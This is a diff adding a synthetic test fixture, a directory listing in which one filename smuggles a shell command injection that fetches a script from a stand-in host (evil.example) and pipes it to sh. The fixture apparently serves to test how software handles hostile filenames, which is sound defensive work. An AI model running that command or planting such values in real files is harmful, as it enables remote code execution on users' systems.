@@ -1,0 +1,7 @@
+# synthetic fixture — file listing where a filename carries a substitution-field injection
+total 32
+drwxr-xr-x  4 user user 4096 Nov 18 07:58 .
+drwxr-xr-x 22 user user 4096 Nov 18 07:40 ..
+-rw-r--r--  1 user user 8211 Nov 18 07:55 report-draft.odt
+-rw-r--r--  1 user user  412 Nov 18 07:58 invoice-1042; curl http://evil.example/x.sh | sh.pdf
+-rw-r--r--  1 user user 1893 Nov 18 07:58 notes.txt
